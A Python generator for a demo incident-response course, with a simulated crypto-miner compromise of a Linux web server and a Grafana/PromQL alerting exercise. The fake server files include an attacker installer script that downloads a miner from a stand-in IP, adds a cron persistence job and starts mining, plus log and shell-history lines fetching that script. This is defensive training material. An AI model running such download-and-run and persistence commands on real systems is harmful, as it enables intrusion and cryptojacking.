#!/usr/bin/env python3
"""Generate Guru's built-in demo course (ui/demo/).

The demo is hand-authored to the exact shape Codex must produce, so it doubles
as the reference example and as a test fixture for both the Rust validator and
the JavaScript simulation engine. Run from the guru/ directory:

    python3 tools/make_demo.py
"""

import json
import os
import random

OUT = os.path.join(os.path.dirname(__file__), "..", "ui", "demo")


# ---------- helpers that emit the full, strict shape ----------

def effects(flags=(), node_status=(), message=""):
    return {
        "set_flags": list(flags),
        "node_status": [{"node_id": n, "status": s} for n, s in node_status],
        "message": message,
    }


def node(id, label, kind, status, detail, x, y):
    return {"id": id, "label": label, "kind": kind, "status": status, "detail": detail, "x": x, "y": y}


def rule(pattern, output, **eff):
    return {"pattern": pattern, "output": output, "effects": effects(**eff)}


def proc(pid, user, cpu, mem, command):
    return {"pid": pid, "user": user, "cpu": cpu, "mem": mem, "command": command}


def svc(name, status, detail):
    return {"name": name, "status": status, "detail": detail}


def w(type_, id_, title, **kw):
    d = {"type": type_, "id": id_, "title": title}
    d.update(kw)
    return d


def series(name, points):
    return {"name": name, "points": points}


def qresp(pattern, result, text="", columns=(), rows=(), labels=(), series_=(), **eff):
    return {
        "pattern": pattern,
        "result": result,
        "text": text,
        "columns": list(columns),
        "rows": [list(r) for r in rows],
        "labels": list(labels),
        "series": list(series_),
        "effects": effects(**eff),
    }


def field(id, label, kind, value="", options=()):
    return {"id": id, "label": label, "kind": kind, "options": list(options), "value": value}


def objective(id, text, kind, question="", options=(), correct=(), accept=(), flags=(), explanation=""):
    return {
        "id": id,
        "text": text,
        "kind": kind,
        "question": question,
        "options": list(options),
        "correct": list(correct),
        "accept": list(accept),
        "flags": list(flags),
        "explanation": explanation,
    }


def log(ts, level, message):
    return {"ts": ts, "level": level, "message": message}


random.seed(7)
LABELS = [f"02:{m:02d}" for m in range(40, 60, 2)] + [f"03:{m:02d}" for m in range(0, 40, 2)]


def noisy(base, spread, n):
    return [round(base + random.uniform(-spread, spread), 1) for _ in range(n)]


# ---------- simulation 1: infected web server (incident) ----------

def auth_log():
    lines = []
    users = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git", "deploy"]
    t = 0
    for i in range(46):
        t += random.randint(2, 9)
        m, s = divmod(t, 60)
        u = users[i % len(users)]
        lines.append(log(f"Nov 12 02:{48 + m:02d}:{s:02d}", "warn",
                         f"sshd[{21000 + i}]: Failed password for invalid user {u} from 203.0.113.45 port {40000 + i * 7} ssh2"))
        if i % 9 == 4:
            lines.append(log(f"Nov 12 02:{48 + m:02d}:{s:02d}", "info",
                             f"sshd[{21500 + i}]: Accepted publickey for deploy from 198.51.100.20 port 52114 ssh2"))
    lines.append(log("Nov 12 03:11:58", "info", "sshd[21877]: Accepted password for deploy from 203.0.113.45 port 41822 ssh2"))
    lines.append(log("Nov 12 03:11:58", "info", "sshd[21877]: pam_unix(sshd:session): session opened for user deploy(uid=1001)"))
    lines.append(log("Nov 12 03:12:20", "warn", "sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh"))
    lines.append(log("Nov 12 03:12:24", "warn", "sudo:   deploy : TTY=pts/1 ; PWD=/tmp/.x ; USER=root ; COMMAND=/bin/bash /tmp/.x/x.sh"))
    lines.append(log("Nov 12 03:20:02", "info", "CRON[22011]: (root) CMD (/tmp/.x/kworkerds -B >/dev/null 2>&1)"))
    return lines


def nginx_log():
    lines = []
    paths = ["/", "/api/products", "/api/cart", "/static/app.js", "/api/login", "/healthz"]
    for i in range(60):
        h = 2 if i < 30 else 3
        m = (40 + i) % 60 if i < 20 else (i - 20) % 60
        status = 200 if i % 13 else 502
        ms = random.randint(20, 90) if i < 34 else random.randint(400, 2400)
        lvl = "info" if status == 200 and ms < 1000 else "warn"
        lines.append(log(f"Nov 12 0{h}:{m:02d}:{random.randint(0,59):02d}", lvl,
                         f'198.51.100.{random.randint(2, 250)} "GET {paths[i % len(paths)]} HTTP/1.1" {status} rt={ms}ms'))
    lines.append(log("Nov 12 03:14:40", "error", "upstream timed out (110: Connection timed out) while reading response header from upstream, upstream: \"http://127.0.0.1:8080/api/cart\""))
    return lines


def syslog():
    return [
        log("Nov 12 03:12:25", "info", "systemd[1]: Started Session 4412 of user deploy."),
        log("Nov 12 03:12:31", "warn", "kernel: [884213.12] kworkerds[4242]: segfault at 0 ip 00007f… error 4 (ignored, restarted)"),
        log("Nov 12 03:13:00", "warn", "kernel: [884242.80] CPU3: Package temperature above threshold, cpu clock throttled"),
        log("Nov 12 03:15:00", "info", "systemd[1]: Starting Daily apt download activities..."),
        log("Nov 12 03:16:41", "error", "app[1880]: java.util.concurrent.TimeoutException: request /api/cart exceeded 2000ms"),
        log("Nov 12 03:21:10", "info", "systemd[1]: logrotate.service: Succeeded."),
    ]


def infected_sim():
    cpu_web01 = noisy(14, 4, 16) + noisy(97, 2, 14)
    cpu_web02 = noisy(16, 5, 30)
    latency = noisy(60, 15, 17) + noisy(1600, 500, 13)
    return {
        "id": "infected-web-01",
        "title": "3 a.m. page: web-01 is burning CPU",
        "kind": "incident",
        "tool": "Linux server, Grafana",
        "minutes": 25,
        "skill_ids": ["triage", "log_analysis", "containment"],
        "briefing": (
            "**PagerDuty, 03:24** — *High CPU on web-01 (97%) and checkout latency p95 > 1.5 s.*\n\n"
            "You are the on-call engineer. The shop runs behind a load balancer on two web servers "
            "(`web-01`, `web-02`) with one database. Nobody deployed tonight.\n\n"
            "1. Find out **what** is eating the CPU and **how** it got there.\n"
            "2. **Contain** it: stop the process, remove its persistence, block the source.\n\n"
            "Start on the map: click `web-01` to open its terminal and logs. The Grafana board is in the "
            "*Apps* tab."
        ),
        "world": {
            "nodes": [
                node("internet", "Internet", "cloud", "unknown", "Customers and… someone else", 6, 50),
                node("lb", "lb-01 (nginx)", "load_balancer", "healthy", "Round-robin to web-01, web-02", 28, 50),
                node("web01", "web-01", "server", "compromised", "Ubuntu 22.04 · 4 vCPU · CPU 97%", 52, 28),
                node("web02", "web-02", "server", "healthy", "Ubuntu 22.04 · 4 vCPU · CPU 16%", 52, 72),
                node("db", "db-01 (PostgreSQL)", "database", "healthy", "Primary database", 78, 50),
                node("mon", "Grafana", "app", "healthy", "Monitoring", 90, 14),
            ],
            "links": [
                {"from": "internet", "to": "lb", "label": "HTTPS"},
                {"from": "lb", "to": "web01", "label": ":8080"},
                {"from": "lb", "to": "web02", "label": ":8080"},
                {"from": "web01", "to": "db", "label": "5432"},
                {"from": "web02", "to": "db", "label": "5432"},
            ],
        },
        "hosts": [
            {
                "node_id": "web01",
                "hostname": "web-01",
                "user": "root",
                "cwd": "/root",
                "motd": "Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\nLast login: Tue Nov 12 03:11:58 2024 from 203.0.113.45",
                "files": [
                    {"path": "/var/log/auth.log", "content": "\n".join(f"{l['ts']} web-01 {l['message']}" for l in auth_log())},
                    {"path": "/var/log/nginx/access.log", "content": "\n".join(f"{l['ts']} {l['message']}" for l in nginx_log())},
                    {"path": "/var/log/syslog", "content": "\n".join(f"{l['ts']} web-01 {l['message']}" for l in syslog())},
                    {"path": "/etc/cron.d/sysupdate", "content": "# system update helper\n*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1\n"},
                    {"path": "/etc/cron.d/logrotate", "content": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n"},
                    {"path": "/tmp/.x/x.sh", "content": "#!/bin/bash\n# installer\ncurl -s http://203.0.113.45/kworkerds -o /tmp/.x/kworkerds\nchmod +x /tmp/.x/kworkerds\necho '*/5 * * * * root /tmp/.x/kworkerds -B >/dev/null 2>&1' > /etc/cron.d/sysupdate\n/tmp/.x/kworkerds -B -o pool.example.com:3333 -u 4Bx9…wallet\n"},
                    {"path": "/tmp/.x/kworkerds", "content": "\u007fELF (binary, 2.1 MB) — strings: xmrig 6.21.0, randomx, pool.example.com:3333"},
                    {"path": "/tmp/.x/config.json", "content": "{\n  \"pools\": [{\"url\": \"pool.example.com:3333\", \"user\": \"4Bx9…wallet\"}],\n  \"cpu\": {\"max-threads-hint\": 100}\n}\n"},
                    {"path": "/home/deploy/.bash_history", "content": "cd /tmp\nmkdir .x\nsudo curl -s http://203.0.113.45/x.sh -o /tmp/.x/x.sh\nsudo bash /tmp/.x/x.sh\nhistory -c\n"},
                    {"path": "/etc/ssh/sshd_config", "content": "Port 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\nMaxAuthTries 6\n"},
                    {"path": "/opt/shop/application.properties", "content": "server.port=8080\nspring.datasource.url=jdbc:postgresql://db-01:5432/shop\nspring.datasource.hikari.maximum-pool-size=20\n"},
                ],
                "processes": [
                    proc(1, "root", 0.0, 0.1, "/sbin/init"),
                    proc(612, "root", 0.0, 0.2, "/usr/sbin/sshd -D"),
                    proc(1880, "shop", 2.1, 18.4, "java -Xmx1g -jar /opt/shop/shop.jar"),
                    proc(1903, "www-data", 0.4, 0.6, "nginx: worker process"),
                    proc(4242, "root", 389.7, 6.1, "/tmp/.x/kworkerds -B"),
                    proc(4250, "root", 0.0, 0.0, "[kworker/3:2-events]"),
                    proc(5120, "root", 0.0, 0.1, "-bash"),
                ],
                "services": [
                    svc("nginx", "active", "A high performance web server and a reverse proxy server"),
                    svc("shop", "active", "Shop Spring Boot application"),
                    svc("cron", "active", "Regular background program processing daemon"),
                    svc("ssh", "active", "OpenBSD Secure Shell server"),
                ],
                "commands": [
                    rule(r"^(sudo )?crontab -l( -u root)?$", "no crontab for root\n# (hint: system-wide jobs live in /etc/cron.d/)"),
                    rule(r"^(sudo )?(netstat|ss) -[a-z]*p[a-z]*$",
                         "Proto Local Address        Foreign Address        State       PID/Program\n"
                         "tcp   0.0.0.0:22           0.0.0.0:*              LISTEN      612/sshd\n"
                         "tcp   0.0.0.0:8080         0.0.0.0:*              LISTEN      1880/java\n"
                         "tcp   10.0.1.11:22         203.0.113.45:41822     ESTABLISHED 5120/sshd: deploy\n"
                         "tcp   10.0.1.11:51544      192.0.2.77:3333        ESTABLISHED 4242/kworkerds\n"
                         "tcp   10.0.1.11:40112      10.0.1.30:5432         ESTABLISHED 1880/java"),
                    rule(r"^(sudo )?ls -l[a-z]* /proc/4242/exe$", "lrwxrwxrwx 1 root root 0 Nov 12 03:12 /proc/4242/exe -> /tmp/.x/kworkerds"),
                    rule(r"^(sudo )?lsof -p 4242$", "COMMAND    PID USER  FD   TYPE DEVICE SIZE/OFF   NODE NAME\nkworkerds 4242 root  txt    REG  259,1  2203648 393311 /tmp/.x/kworkerds\nkworkerds 4242 root    5u  IPv4 991231      0t0    TCP web-01:51544->192.0.2.77:3333 (ESTABLISHED)"),
                    rule(r"^(sudo )?iptables -(A|I) INPUT .*-s 203\.0\.113\.45.*-j (DROP|REJECT)$", "",
                         flags=["blocked:203.0.113.45"], message="Firewall: traffic from 203.0.113.45 is now dropped."),
                    rule(r"^(sudo )?ufw (insert 1 )?deny from 203\.0\.113\.45.*$", "Rule inserted",
                         flags=["blocked:203.0.113.45"], message="Firewall: traffic from 203.0.113.45 is now dropped."),
                    rule(r"^(sudo )?iptables -(A|I) OUTPUT .*-d 192\.0\.2\.77.*-j (DROP|REJECT)$", "",
                         flags=["blocked:pool"], message="Outbound connection to the mining pool blocked."),
                    rule(r"^(sudo )?iptables -L.*$", "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination"),
                    rule(r"^(sudo )?(passwd|chage) .*deploy.*$", "passwd: password updated successfully",
                         flags=["rotated:deploy"], message="deploy's password has been rotated."),
                    rule(r"^(sudo )?(free|free -[a-z]+)$", "               total        used        free      shared  buff/cache   available\nMem:            7951        2410         844          12        4697        5212\nSwap:              0           0           0"),
                    rule(r"^uptime$", " 03:26:11 up 10 days,  5:41,  1 user,  load average: 4.12, 4.03, 3.20"),
                    rule(r"^(sudo )?last( -n \d+)?$", "deploy   pts/1        203.0.113.45     Tue Nov 12 03:11   still logged in\ndeploy   pts/0        198.51.100.20    Mon Nov 11 17:02 - 17:40  (00:38)"),
                    rule(r"^(sudo )?pkill .*kworkerds.*$", "", flags=["killed:4242"], message="Process kworkerds (4242) terminated."),
                ],
            }
        ],
        "logs": [
            {"id": "auth", "name": "web-01 · /var/log/auth.log", "node_id": "web01", "lines": auth_log()},
            {"id": "nginx", "name": "web-01 · nginx access", "node_id": "web01", "lines": nginx_log()},
            {"id": "syslog", "name": "web-01 · syslog", "node_id": "web01", "lines": syslog()},
        ],
        "apps": [
            {
                "id": "grafana",
                "name": "Grafana (simulated)",
                "node_id": "mon",
                "accent": "#f46800",
                "screens": [
                    {
                        "id": "overview",
                        "title": "Shop · Node overview",
                        "widgets": [
                            w("stat", "s1", "web-01 CPU", value="97", unit="%", status="crit"),
                            w("stat", "s2", "web-02 CPU", value="16", unit="%", status="ok"),
                            w("stat", "s3", "Checkout p95", value="1.6", unit="s", status="crit"),
                            w("timeseries", "t1", "CPU busy by instance", unit="%", labels=LABELS,
                              series=[series("web-01", cpu_web01), series("web-02", cpu_web02)], thresholds=[85]),
                            w("timeseries", "t2", "HTTP p95 latency (ms)", unit="ms", labels=LABELS,
                              series=[series("checkout", latency)], thresholds=[1000]),
                            w("table", "tb", "Top outbound connections (web-01)", columns=["Remote", "Port", "Bytes/s"],
                              rows=[["192.0.2.77", "3333", "38 KB"], ["10.0.1.30", "5432", "210 KB"], ["203.0.113.45", "22", "2 KB"]]),
                        ],
                    }
                ],
            }
        ],
        "objectives": [
            objective("o1", "Identify the process burning the CPU", "answer",
                      question="Which process is consuming the CPU on web-01?",
                      options=["java (the shop app, PID 1880)", "kworkerds (PID 4242)", "nginx worker (PID 1903)", "[kworker/3:2-events] (PID 4250)"],
                      correct=[1],
                      explanation="PID 4242 runs from /tmp/.x — a hidden directory in /tmp. Real kernel workers are shown in [brackets] and never live on disk. The name imitates kworker to blend in."),
            objective("o2", "Find where the attacker came from", "answer",
                      question="From which IP address did the attacker log in?",
                      accept=[r"203\.0\.113\.45"],
                      explanation="auth.log shows a password brute force against many usernames from 203.0.113.45, then 'Accepted password for deploy' from the same address at 03:11:58."),
            objective("o3", "Name the persistence mechanism", "answer",
                      question="How would the miner come back after a reboot or kill?",
                      options=["A systemd service", "A cron job in /etc/cron.d/sysupdate", "~/.bashrc of deploy", "It would not come back"],
                      correct=[1],
                      explanation="x.sh wrote /etc/cron.d/sysupdate, which relaunches /tmp/.x/kworkerds every 5 minutes. Kill without removing it, and the miner is back within minutes."),
            objective("o4", "Stop the miner", "state", flags=["killed:4242"],
                      explanation="kill 4242 (or pkill kworkerds). In a real incident, capture evidence first: ls -l /proc/4242/exe, lsof -p 4242."),
            objective("o5", "Remove the persistence and the payload", "state",
                      flags=["removed:/etc/cron.d/sysupdate", "removed:/tmp/.x"],
                      explanation="rm /etc/cron.d/sysupdate and rm -rf /tmp/.x. Removing only one of them leaves the door open."),
            objective("o6", "Block the attacker's address", "state", flags=["blocked:203.0.113.45"],
                      explanation="iptables -I INPUT -s 203.0.113.45 -j DROP (or ufw deny from …). The real fix is to disable PasswordAuthentication in sshd_config and rotate deploy's credentials."),
        ],
        "hints": [
            "Start with what is using the CPU right now: `top` or `ps aux` on web-01.",
            "The process lives in a hidden directory. How did it get there? Read /var/log/auth.log (try `grep Accepted`) and the deploy user's history.",
            "Kill PID 4242, then `rm /etc/cron.d/sysupdate` and `rm -rf /tmp/.x`, then `iptables -I INPUT -s 203.0.113.45 -j DROP`.",
        ],
        "debrief": (
            "### What happened\n"
            "An SSH **password brute force** from `203.0.113.45` guessed the password of the `deploy` user "
            "(`PasswordAuthentication yes`). The attacker used deploy's sudo rights to download `x.sh`, which installed "
            "an XMRig **crypto miner** disguised as `kworkerds` in `/tmp/.x`, and a **cron job** to relaunch it every 5 minutes.\n\n"
            "### How professionals handle it\n"
            "1. **Triage** from symptoms: `top` → suspicious PID → `ls -l /proc/<pid>/exe`, `lsof -p`, `ss -tnp`.\n"
            "2. **Scope**: auth logs for the entry point (`grep Accepted /var/log/auth.log`), shell history, new cron/systemd units.\n"
            "3. **Contain**: kill, remove persistence *and* payload, block the IPs — after capturing evidence.\n"
            "4. **Eradicate & harden**: disable password SSH logins, rotate credentials, restrict sudo, and in production "
            "**rebuild the host from a clean image**: you cannot fully trust a machine that had root compromise.\n\n"
            "### Prevent it\n`PasswordAuthentication no`, fail2ban or rate limits, least-privilege sudo, and alerts on new cron "
            "entries and outbound connections to unusual ports (3333 is a classic mining-pool port)."
        ),
    }


# ---------- simulation 2: Grafana + PromQL (tool) ----------

def grafana_sim():
    req = noisy(120, 15, 30)
    err = [round(v, 2) for v in noisy(0.4, 0.3, 22) + noisy(6.5, 1.0, 8)]
    cpu_a = noisy(35, 6, 30)
    cpu_b = noisy(78, 8, 30)
    return {
        "id": "grafana-alerting",
        "title": "Build the on-call dashboard and alert in Grafana",
        "kind": "tool",
        "tool": "Grafana + Prometheus",
        "minutes": 25,
        "skill_ids": ["promql", "dashboards", "alerting"],
        "briefing": (
            "Your team just installed Prometheus, but nobody can see anything yet. In this **simulated Grafana** you will:\n\n"
            "1. Connect the **Prometheus data source** (it runs at `http://prometheus:9090`).\n"
            "2. Use **Explore** to write the PromQL queries an on-call engineer needs.\n"
            "3. Create an **alert rule** that pages when the 5xx error rate stays above 5% for 5 minutes.\n\n"
            "Open *Grafana (simulated)* in the Apps tab. Everything behaves like the real tool's workflow: "
            "Connections → Data sources, Explore, Alerting → Alert rules."
        ),
        "world": {
            "nodes": [
                node("api", "checkout-api (×2)", "service", "degraded", "Exposes /metrics", 20, 50),
                node("prom", "Prometheus", "service", "healthy", "Scrapes every 15s", 50, 50),
                node("graf", "Grafana", "app", "healthy", "Dashboards & alerting", 80, 50),
            ],
            "links": [
                {"from": "prom", "to": "api", "label": "scrape /metrics"},
                {"from": "graf", "to": "prom", "label": "PromQL"},
            ],
        },
        "hosts": [],
        "logs": [
            {"id": "api", "name": "checkout-api · application log", "node_id": "api", "lines": [
                log("03:00:01", "info", "GET /api/cart 200 41ms"),
                log("03:00:03", "info", "GET /api/products 200 22ms"),
                log("03:02:11", "warn", "payment-provider slow response 1800ms"),
                log("03:04:40", "error", "POST /api/checkout 503 upstream payment-provider unavailable"),
                log("03:04:41", "error", "POST /api/checkout 503 upstream payment-provider unavailable"),
                log("03:05:02", "error", "circuit breaker OPEN for payment-provider"),
                log("03:05:30", "info", "GET /api/cart 200 39ms"),
            ]},
        ],
        "apps": [
            {
                "id": "grafana",
                "name": "Grafana (simulated)",
                "node_id": "graf",
                "accent": "#f46800",
                "screens": [
                    {
                        "id": "datasources",
                        "title": "Connections › Data sources",
                        "widgets": [
                            w("markdown", "md1", "Add data source",
                              text="Grafana needs a **data source** before any panel can show data. Choose the type and the URL Grafana's *server* uses to reach it (not your browser)."),
                            w("form", "ds", "Prometheus settings",
                              fields=[
                                  field("type", "Type", "select", "Prometheus", ["Prometheus", "Loki", "PostgreSQL", "Elasticsearch"]),
                                  field("url", "Prometheus server URL", "text", "http://localhost:9090"),
                                  field("scrape", "Scrape interval", "text", "15s"),
                              ],
                              submit_label="Save & test",
                              rules=[
                                  {"conditions": [{"field": "type", "pattern": "^Prometheus$"}, {"field": "url", "pattern": r"^https?://prometheus:9090/?$"}],
                                   "ok": True, "message": "✔ Successfully queried the Prometheus API.",
                                   "effects": effects(flags=["datasource_ok"], message="Data source connected.")},
                                  {"conditions": [{"field": "url", "pattern": "localhost|127\\.0\\.0\\.1"}],
                                   "ok": False, "message": "✖ Post \"http://localhost:9090/api/v1/query\": dial tcp 127.0.0.1:9090: connect: connection refused — localhost here means the Grafana container itself, not Prometheus.",
                                   "effects": effects()},
                              ],
                              fallback="✖ Error reading Prometheus: bad_response: the server did not respond with a Prometheus API. Check type and URL."),
                        ],
                    },
                    {
                        "id": "explore",
                        "title": "Explore",
                        "widgets": [
                            w("markdown", "md2", "Metrics available",
                              text="`http_requests_total{job, instance, route, status}` (counter) · `http_request_duration_seconds_bucket{le, route}` (histogram) · `node_cpu_seconds_total{mode, instance}` (counter) · `up`"),
                            w("query", "q", "Query (PromQL)", language="PromQL", placeholder="e.g. up",
                              responses=[
                                  qresp(r"^up$", "table", columns=["instance", "job", "value"],
                                        rows=[["api-a:8080", "checkout-api", "1"], ["api-b:8080", "checkout-api", "1"], ["prometheus:9090", "prometheus", "1"]]),
                                  qresp(r"^http_requests_total$", "text",
                                        text="Raw counter values only ever go up (e.g. 1 830 442). A counter is useless on its own: wrap it in rate() to get requests per second."),
                                  qresp(r"^sum\s*(by\s*\(\s*\w+\s*\)\s*)?\(\s*rate\(\s*http_requests_total(\{[^}]*\})?\[\s*\d+[sm]\s*\]\s*\)\s*\)(\s*by\s*\(\s*\w+\s*\))?$",
                                        "timeseries", labels=LABELS, series_=[series("req/s", req)],
                                        flags=["query:rate"], message="Nice: rate() over a counter → requests per second."),
                                  qresp(r"rate\(\s*http_requests_total\{[^}]*status\s*=~\s*\"5\.\.\"[^}]*\}\[\s*\d+[sm]\s*\]\s*\)\s*\)?\s*/\s*sum\s*(by\s*\(\s*\w+\s*\)\s*)?\(\s*rate\(\s*http_requests_total(\{[^}]*\})?\[\s*\d+[sm]\s*\]",
                                        "timeseries", labels=LABELS, series_=[series("5xx ratio %", err)],
                                        flags=["query:error_ratio"], message="That's the error ratio: 5xx rate ÷ total rate. It crosses 5% at 03:04."),
                                  qresp(r"^rate\(\s*http_requests_total\[\s*\d+[sm]\s*\]\s*\)$", "timeseries", labels=LABELS,
                                        series_=[series("api-a /api/cart 200", noisy(40, 5, 30)), series("api-b /api/cart 200", noisy(38, 5, 30)), series("api-a /api/checkout 503", [0.0] * 22 + noisy(6, 1, 8))],
                                        text="One line per label combination. Use sum by (…) to aggregate."),
                                  qresp(r"node_cpu_seconds_total\{[^}]*mode\s*=\s*\"idle\"[^}]*\}", "timeseries", labels=LABELS,
                                        series_=[series("api-a:9100", cpu_a), series("api-b:9100", cpu_b)],
                                        flags=["query:cpu"], message="CPU busy % per instance: api-b is running much hotter."),
                                  qresp(r"histogram_quantile\(\s*0?\.95\s*,", "table", columns=["route", "p95 (s)"],
                                        rows=[["/api/checkout", "1.84"], ["/api/cart", "0.12"], ["/api/products", "0.07"]],
                                        flags=["query:p95"], message="p95 from a histogram: histogram_quantile over rate() of the _bucket series, summed by le."),
                                  qresp(r"^\s*rate\(\s*http_requests_total\s*\)\s*$", "error",
                                        text="bad_data: 1:6: parse error: expected type range vector in call to function \"rate\", got instant vector — add a range, e.g. [5m]"),
                              ],
                              fallback="No data. Check the metric name and labels. Tip: counters need rate(…[5m]); aggregate with sum by (label)."),
                        ],
                    },
                    {
                        "id": "alerting",
                        "title": "Alerting › Alert rules › New",
                        "widgets": [
                            w("markdown", "md3", "Alert rule",
                              text="A rule = **query** + **condition** + **pending period** (`for`). The pending period stops one bad scrape from waking someone up."),
                            w("form", "alert", "New alert rule",
                              fields=[
                                  field("name", "Rule name", "text", ""),
                                  field("query", "Query (PromQL)", "textarea", ""),
                                  field("op", "Condition", "select", "IS ABOVE", ["IS ABOVE", "IS BELOW"]),
                                  field("threshold", "Threshold", "number", ""),
                                  field("for", "Pending period", "select", "0s", ["0s", "1m", "5m", "15m"]),
                                  field("severity", "Label severity", "select", "warning", ["info", "warning", "critical"]),
                              ],
                              submit_label="Save rule",
                              rules=[
                                  {"conditions": [{"field": "query", "pattern": "status\\s*=~\\s*\"5\\.\\.\".*/"},
                                                  {"field": "op", "pattern": "ABOVE"},
                                                  {"field": "threshold", "pattern": "^(0?\\.05|5)$"},
                                                  {"field": "for", "pattern": "^5m$"}],
                                   "ok": True, "message": "✔ Rule saved. State: Pending → Firing (error ratio 6.4% for 5m).",
                                   "effects": effects(flags=["alert_created"], node_status=[("api", "degraded")], message="Alert 'High 5xx ratio' is FIRING.")},
                                  {"conditions": [{"field": "for", "pattern": "^0s$"}],
                                   "ok": False, "message": "✖ Saved, but with a 0s pending period this would page on every brief spike. On-call engineers will hate you. Use 5m.",
                                   "effects": effects()},
                                  {"conditions": [{"field": "query", "pattern": "^\\s*sum\\s*\\(\\s*rate\\(\\s*http_requests_total(\\{\\})?\\[[^\\]]+\\]\\s*\\)\\s*\\)\\s*$"}],
                                   "ok": False, "message": "✖ That query is total traffic, not errors. Alert on the 5xx *ratio* (errors ÷ all requests).",
                                   "effects": effects()},
                              ],
                              fallback="✖ The rule doesn't match the requirement: 5xx ratio above 5% (0.05) for 5m. Check the query, threshold and pending period."),
                        ],
                    },
                ],
            }
        ],
        "objectives": [
            objective("g1", "Connect Prometheus as a data source", "state", flags=["datasource_ok"],
                      explanation="Grafana's server reaches Prometheus by its service name: http://prometheus:9090. 'localhost' would point at Grafana itself."),
            objective("g2", "Chart total request throughput", "state", flags=["query:rate"],
                      explanation="sum(rate(http_requests_total[5m])). Counters only increase; rate() turns them into per-second values."),
            objective("g3", "Chart the 5xx error ratio", "state", flags=["query:error_ratio"],
                      explanation="sum(rate(http_requests_total{status=~\"5..\"}[5m])) / sum(rate(http_requests_total[5m]))"),
            objective("g4", "Find the slowest route", "answer", question="Which route has the worst p95 latency?",
                      options=["/api/cart", "/api/products", "/api/checkout", "/metrics"], correct=[2],
                      explanation="histogram_quantile(0.95, sum by (le, route) (rate(http_request_duration_seconds_bucket[5m]))) shows /api/checkout at 1.84 s."),
            objective("g5", "Create an alert: 5xx ratio > 5% for 5 minutes", "state", flags=["alert_created"],
                      explanation="Alert on symptoms users feel (error ratio), with a pending period so it fires on sustained problems only."),
        ],
        "hints": [
            "Start in Connections › Data sources. Which hostname does Grafana use to reach Prometheus?",
            "In Explore, counters need rate(metric[5m]); wrap in sum(...) to aggregate.",
            "Error ratio: sum(rate(http_requests_total{status=~\"5..\"}[5m])) / sum(rate(http_requests_total[5m])) — then alert IS ABOVE 0.05 for 5m.",
        ],
        "debrief": (
            "### What you practised\n"
            "- **Data sources**: Grafana queries from its server, so URLs must resolve *there*.\n"
            "- **PromQL fundamentals**: `rate()` on counters, `sum by (label)`, ratios, and `histogram_quantile` for latency percentiles.\n"
            "- **Alerting**: alert on user-facing symptoms (error ratio, latency), with a pending period to avoid flapping pages.\n\n"
            "### On the real tool\nThe same steps in Grafana 10/11: *Connections → Data sources → Prometheus*, *Explore*, and "
            "*Alerting → Alert rules → New alert rule*. The PromQL is identical."
        ),
    }


# ---------- course manifest and modules ----------

def course():
    return {
        "format": 1,
        "slug": "demo-incident-response",
        "title": "Linux Incident Response & Monitoring (demo)",
        "topic": "Linux incident response and monitoring",
        "goal": "Handle a production incident from alert to fix",
        "level": 60,
        "level_label": "Intermediate",
        "hours": 1.5,
        "summary": "A built-in sample that shows how Guru courses work: two short lessons and two simulations, an infected server and a simulated Grafana. No AI and no installs needed.",
        "target_performance": "Triage and contain a compromised Linux host from symptoms and logs, and build the Grafana queries and alert that would have caught it.",
        "out_of_scope": ["Forensic imaging", "Kubernetes", "Log shipping pipelines"],
        "skills": [
            {"id": "triage", "name": "Process & network triage", "why": "Find what is wrong in minutes", "weight": 9},
            {"id": "log_analysis", "name": "Log analysis", "why": "Logs tell you how it happened", "weight": 8},
            {"id": "containment", "name": "Containment", "why": "Stop the bleeding without destroying evidence", "weight": 8},
            {"id": "promql", "name": "PromQL", "why": "Ask your metrics the right questions", "weight": 8},
            {"id": "dashboards", "name": "Dashboards & data sources", "why": "See the system at a glance", "weight": 6},
            {"id": "alerting", "name": "Alerting", "why": "Be paged for what matters, only", "weight": 7},
        ],
        "modules": [
            {"id": "m1", "title": "Triage a compromised Linux server", "minutes": 45,
             "summary": "From a CPU alert to root cause and containment using ps/top, ss, logs and cron.",
             "objectives": ["Find the offending process and its binary", "Trace the entry point in auth logs", "Contain: kill, remove persistence, block"],
             "skill_ids": ["triage", "log_analysis", "containment"],
             "sims": [{"id": "infected-web-01", "title": "3 a.m. page: web-01 is burning CPU", "kind": "incident", "tool": "Linux server, Grafana", "premise": "A crypto miner after an SSH brute force"}]},
            {"id": "m2", "title": "Monitoring with Grafana and PromQL", "minutes": 45,
             "summary": "Data sources, the PromQL you will use daily, and alerts that only page for real problems.",
             "objectives": ["Connect Prometheus", "Write rate/sum/ratio/quantile queries", "Create a symptom-based alert rule"],
             "skill_ids": ["promql", "dashboards", "alerting"],
             "sims": [{"id": "grafana-alerting", "title": "Build the on-call dashboard and alert in Grafana", "kind": "tool", "tool": "Grafana + Prometheus", "premise": "Fresh Prometheus, no dashboards, error spike tonight"}]},
        ],
        "capstone": {"id": "", "title": "", "kind": "", "tool": "", "premise": ""},
        "research": {"stackexchange_site": "serverfault", "tags": ["linux", "security"], "queries": ["high cpu unknown process"]},
        "status": "ready",
        "status_detail": "",
        "created_unix": 0,
        "generator": "hand-written demo",
    }


M1_LESSON = """## Why this matters
When a server misbehaves at 3 a.m., the first ten minutes decide whether you fix it or make it worse. A repeatable triage routine beats intuition.

## The mental model
Think in three questions, always in this order:

```
SYMPTOM  ──►  CAUSE (what process / change?)  ──►  ENTRY (how did it get here?)
   top, metrics        ps, /proc, ss, lsof               logs, history, cron, units
```

Contain only after you know the cause *and* the persistence, or it comes back.

## Worked example
Alert: *CPU 97% on web-01*.

1. `top` (or `ps aux --sort=-%cpu | head`) shows PID 4242 `kworkerds` at 390% CPU.
   > Pause and predict: real kernel threads appear as `[kworker/...]` in brackets. What does a *non-bracketed* kworker imply?
2. `ls -l /proc/4242/exe` → `/tmp/.x/kworkerds`. Binaries do not belong in hidden folders under /tmp.
3. `ss -tnp` shows it connected to `192.0.2.77:3333`, a typical mining-pool port.
